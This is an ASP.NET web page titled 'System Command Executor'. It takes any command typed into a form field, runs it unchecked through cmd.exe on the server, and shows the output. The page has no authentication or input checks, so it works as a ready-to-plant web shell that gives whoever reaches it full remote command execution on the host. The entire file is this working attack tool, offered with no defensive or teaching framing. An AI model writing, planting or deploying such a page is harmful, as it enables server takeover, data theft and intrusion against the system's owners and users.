<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>

<!DOCTYPE html>
<html>
<head>
    <title>Execute System Command</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            color: #333;
            padding: 20px;
        }
        h1 {
            color: #444;
        }
        textarea {
            width: 100%;
            height: 150px;
            font-family: monospace;
            padding: 10px;
        }
        input[type="submit"] {
            margin-top: 10px;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
        }
        .output {
            background-color: #fff;
            border: 1px solid #ccc;
            padding: 10px;
            margin-top: 20px;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>
    <h1>System Command Executor</h1>
    <form method="post">
        <label for="command">Enter Command:</label><br />
        <input type="text" id="command" name="command" style="width: 80%;" />
        <input type="submit" value="Execute" />
    </form>

    <div class="output">
        <h2>Command Output:</h2>
        <%
            if (IsPostBack)
            {
                string command = Request.Form["command"];
                if (!string.IsNullOrEmpty(command))
                {
                    try
                    {
                        Process process = new Process();
                        process.StartInfo.FileName = "cmd.exe";
                        process.StartInfo.Arguments = "/c " + command;
                        process.StartInfo.RedirectStandardOutput = true;
                        process.StartInfo.RedirectStandardError = true;
                        process.StartInfo.UseShellExecute = false;
                        process.StartInfo.CreateNoWindow = true;
                        process.Start();

                        string output = process.StandardOutput.ReadToEnd();
                        string errorOutput = process.StandardError.ReadToEnd();

                        process.WaitForExit();

                        if (!string.IsNullOrEmpty(output))
                        {
                            Response.Write("<pre>" + Server.HtmlEncode(output) + "</pre>");
                        }
                        if (!string.IsNullOrEmpty(errorOutput))
                        {
                            Response.Write("<pre style='color: red;'>" + Server.HtmlEncode(errorOutput) + "</pre>");
                        }
                    }
                    catch (Exception ex)
                    {
                        Response.Write("<p style='color: red;'>Error: " + Server.HtmlEncode(ex.Message) + "</p>");
                    }
                }
            }
        %>
    </div>
</body>
</html>
